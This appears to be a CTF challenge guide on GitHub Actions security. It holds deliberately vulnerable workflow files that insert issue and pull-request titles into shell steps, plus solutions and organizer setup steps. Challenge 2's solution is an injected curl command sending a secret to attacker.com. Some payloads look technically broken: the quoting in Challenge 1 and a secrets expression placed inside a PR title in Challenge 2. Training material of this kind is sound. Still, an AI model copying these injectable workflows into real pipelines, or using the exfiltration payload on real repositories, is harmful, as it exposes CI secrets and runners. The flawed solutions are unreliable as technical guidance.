# Advanced Attack Scenario 10: GitHub Actions CTF-style challenge

This scenario is a CTF-style challenge that will test your knowledge of GitHub Actions security. The challenge consists of a series of progressively more difficult challenges, each of which involves a different vulnerability. To complete the challenge, you will need to find the flag at the end of each challenge.

## Challenge 1: Command Injection

**Description:**

The first challenge is a simple command injection vulnerability. You will need to find a way to execute arbitrary commands on the runner.

**Vulnerable Code:**
```yaml
name: Challenge 1
on:
  issues:
    types: [opened]
jobs:
  challenge1:
    runs-on: ubuntu-latest
    steps:
      - name: Challenge 1
        run: |
          echo "The flag is in a file called flag.txt"
          echo "flag{this_is_the_flag}" > flag.txt
          echo "Your input: ${{ github.event.issue.title }}"
```

**Hint:**

Try to use a shell command to read the contents of the `flag.txt` file.

**Solution:**

Create an issue with the title: `'; cat flag.txt'`

## Challenge 2: Secret Exfiltration

**Description:**

The second challenge is a secret exfiltration vulnerability. You will need to find a way to exfiltrate a secret from the workflow.

**Vulnerable Code:**
```yaml
name: Challenge 2
on:
  pull_request_target:
    types: [opened]
jobs:
  challenge2:
    runs-on: ubuntu-latest
    steps:
      - name: Challenge 2
        run: |
          echo "The flag is in a secret called FLAG"
          echo "Your input: ${{ github.event.pull_request.title }}"
```

**Hint:**

Try to use a shell command to exfiltrate the secret to a third-party service.

**Solution:**

Create a pull request with the title: `'; curl http://attacker.com/?flag=${{ secrets.FLAG }}'`

## Challenge 3: Privilege Escalation

**Description:**

The third challenge is a privilege escalation vulnerability. You will need to find a way to escalate your privileges on the runner.

**Vulnerable Code:**
```yaml
name: Challenge 3
on:
  push:
    branches: [ main ]
jobs:
  challenge3:
    runs-on: self-hosted
    steps:
      - name: Challenge 3
        run: |
          echo "The flag is in the /root directory"
```

**Hint:**

Try to use a kernel exploit to gain root access to the host machine.

**Solution:**

Use a kernel exploit to gain root access to the host machine and then read the contents of the `/root/flag.txt` file.

## Organizer Instructions

### Setting up the repository

1.  Create a new repository for the CTF.
2.  Add the vulnerable workflows to the `.github/workflows` directory.

### Creating the flags

1.  For challenge 1, the flag is created dynamically in the workflow.
2.  For challenge 2, create a secret called `FLAG` with the flag.
3.  For challenge 3, create a file called `flag.txt` in the `/root` directory of the self-hosted runner with the flag.

### Managing secrets

1.  For challenge 2, you will need to create a secret called `FLAG` with the flag.

### Setting up the self-hosted runner

1.  For challenge 3, you will need to set up a self-hosted runner. You can find instructions on how to do this in the [GitHub documentation](https://docs.github.com/en/actions/hosting-your-own-runners/adding-self-hosted-runners).

### Running the CTF

1.  Once you have set up the repository and the challenges, you can invite users to participate in the CTF.
2.  To verify the solutions, you can check the workflow logs for the correct output.
